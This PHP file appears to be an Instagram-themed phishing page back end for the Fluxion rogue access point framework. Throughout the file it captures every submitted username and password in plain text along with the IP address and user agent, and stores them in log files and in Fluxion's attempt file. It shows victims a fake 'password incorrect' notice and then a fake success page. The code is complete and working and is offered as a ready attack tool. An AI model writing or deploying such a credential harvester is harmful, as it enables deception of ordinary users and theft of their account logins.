<?php
/*
 * Instagram portal credential capture.
 *
 * The stock Fluxion authenticator (lib/authenticator.php) exists to verify a
 * candidate against the target's WPA handshake. That check is meaningless for
 * a web login page, so this portal posts to its own endpoint instead: every
 * attempt is appended to instagram_credentials.log next to the portal root
 * (i.e. <FLUXIONWorkspacePath>/instagram_credentials.log) and the visitor is
 * sent back to the login form with the usual "password incorrect" notice.
 * After MAX_ATTEMPTS attempts from the same address the success page is shown
 * so the flow terminates instead of looping forever.
 *
 * Log format, one attempt per line, tab separated:
 *   ISO-8601 time <TAB> client IP <TAB> username <TAB> password <TAB> user agent
 */

declare(strict_types=1);

// A stray notice in the response body would break the redirect and leak
// interpreter details to the visitor; keep them out of the output entirely.
ini_set('display_errors', '0');

const MAX_ATTEMPTS = 2;

$workspace = dirname(__DIR__);
$logPath   = $workspace . '/instagram_credentials.log';
$statePath = $workspace . '/instagram_attempts.json';
$hitsPath  = $workspace . '/hit.txt';
$ipPath    = $workspace . '/ip_hits';

function clean_field(string $value): string
{
    $value = str_replace(["\r", "\n", "\t"], ' ', $value);
    $value = trim($value);
    // Byte-based on purpose: php-cgi is not guaranteed to ship mbstring.
    return substr($value, 0, 256);
}

function append_locked(string $path, string $data, int $mode = 0640): bool
{
    $handle = @fopen($path, 'ab');
    if ($handle === false) {
        return false;
    }
    $written = false;
    if (flock($handle, LOCK_EX)) {
        $written = fwrite($handle, $data) !== false;
        fflush($handle);
        flock($handle, LOCK_UN);
    }
    fclose($handle);
    @chmod($path, $mode);
    return $written;
}

function bump_attempts(string $path, string $ip): int
{
    $handle = @fopen($path, 'c+');
    if ($handle === false) {
        // Cannot persist state: keep the visitor on the retry page rather than
        // ending the exchange on a fabricated success.
        return 1;
    }
    $count = 1;
    if (flock($handle, LOCK_EX)) {
        $raw = stream_get_contents($handle);
        $map = [];
        if (is_string($raw) && $raw !== '') {
            $decoded = json_decode($raw, true);
            if (is_array($decoded)) {
                $map = $decoded;
            }
        }
        $count = isset($map[$ip]) ? ((int) $map[$ip]) + 1 : 1;
        $map[$ip] = $count;
        ftruncate($handle, 0);
        rewind($handle);
        fwrite($handle, json_encode($map, JSON_PRETTY_PRINT));
        fflush($handle);
        flock($handle, LOCK_UN);
    }
    fclose($handle);
    @chmod($path, 0640);
    return $count;
}

function bump_hits(string $path): void
{
    $handle = @fopen($path, 'c+');
    if ($handle === false) {
        return;
    }
    if (flock($handle, LOCK_EX)) {
        $raw = stream_get_contents($handle);
        $hits = (int) trim((string) $raw) + 1;
        ftruncate($handle, 0);
        rewind($handle);
        fwrite($handle, (string) $hits);
        fflush($handle);
        flock($handle, LOCK_UN);
    }
    fclose($handle);
}

if (($_SERVER['REQUEST_METHOD'] ?? 'GET') !== 'POST') {
    header('Location: index.html', true, 302);
    exit;
}

$ip       = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$agent    = clean_field(is_string($_SERVER['HTTP_USER_AGENT'] ?? null) ? $_SERVER['HTTP_USER_AGENT'] : '-');
$username = clean_field(is_string($_POST['username'] ?? null) ? $_POST['username'] : '');
$password = clean_field(is_string($_POST['password'] ?? null) ? $_POST['password'] : '');

if ($username === '' && $password === '') {
    header('Location: error.html', true, 302);
    exit;
}

$line = implode("\t", [
    date('c'),
    $ip,
    $username,
    $password,
    $agent,
]) . "\n";

if (!append_locked($logPath, $line)) {
    // Last resort so an attempt is never silently dropped: a private file in
    // the system temp directory, outside the served document root.
    append_locked(sys_get_temp_dir() . '/instagram_credentials.log', $line, 0600);
}

// Mirror the pair into Fluxion's own attempt file, which the Captive Portal
// arbiter copies into its pass log and then truncates.
if ($username !== '' && $password !== '') {
    append_locked($workspace . '/pwdattempt.txt', $username . ':' . $password . "\n", 0640);
}

bump_hits($hitsPath);
append_locked($ipPath, $ip . "\n", 0640);

$attempts = bump_attempts($statePath, $ip);

if ($attempts >= MAX_ATTEMPTS) {
    header('Location: final.html', true, 302);
} else {
    header('Location: error.html?u=' . rawurlencode($username), true, 302);
}
exit;
